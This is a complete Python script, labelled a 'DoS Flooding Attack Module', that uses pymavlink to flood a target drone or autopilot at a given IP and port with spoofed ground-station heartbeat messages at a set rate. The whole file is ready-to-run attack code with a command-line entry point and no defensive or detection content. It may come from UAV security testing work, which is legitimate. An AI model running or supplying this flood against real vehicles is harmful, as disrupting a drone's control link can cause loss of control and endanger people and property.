#!/usr/bin/env python3
"""
DoS Flooding Attack Module

Floods system with rapid message bursts.
"""
import time
import sys
from pymavlink import mavutil

def attack_dos_flooding(mav, duration_sec: int = 5, rate_hz: int = 100):
    """
    Flood system with messages
    
    Args:
        mav: MAVLink connection
        duration_sec: Duration of attack (seconds)
        rate_hz: Messages per second
    """
    print(f"[DOS FLOOD] Starting DoS attack...")
    print(f"[DOS FLOOD] Duration: {duration_sec}s, Rate: {rate_hz} msg/s")
    
    start_time = time.time()
    msg_count = 0
    
    try:
        while (time.time() - start_time) < duration_sec:
            mav.mav.heartbeat_send(
                type=mavutil.mavlink.MAV_TYPE_GCS,
                autopilot=mavutil.mavlink.MAV_AUTOPILOT_INVALID,
                base_mode=0,
                custom_mode=0,
                system_status=mavutil.mavlink.MAV_STATE_ACTIVE
            )
            
            msg_count += 1
            time.sleep(1.0 / rate_hz)
            
            if msg_count % 100 == 0:
                elapsed = time.time() - start_time
                actual_rate = msg_count / elapsed
                print(f"[DOS FLOOD] {msg_count} messages sent ({actual_rate:.1f} msg/s)")
        
        elapsed = time.time() - start_time
        actual_rate = msg_count / elapsed
        print(f"[DOS FLOOD] Attack complete! {msg_count} messages in {elapsed:.1f}s ({actual_rate:.1f} msg/s)")
        
    except KeyboardInterrupt:
        print("[DOS FLOOD] Attack interrupted by user")
    except Exception as e:
        print(f"[DOS FLOOD] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python dos_flood.py <target_ip> <target_port> [duration] [rate]")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 5
    rate = int(sys.argv[4]) if len(sys.argv) > 4 else 100
    
    connection_string = f'udpout:{target_ip}:{target_port}'
    mav = mavutil.mavlink_connection(connection_string, source_system=255, source_component=190)
    
    time.sleep(1)
    attack_dos_flooding(mav, duration, rate)
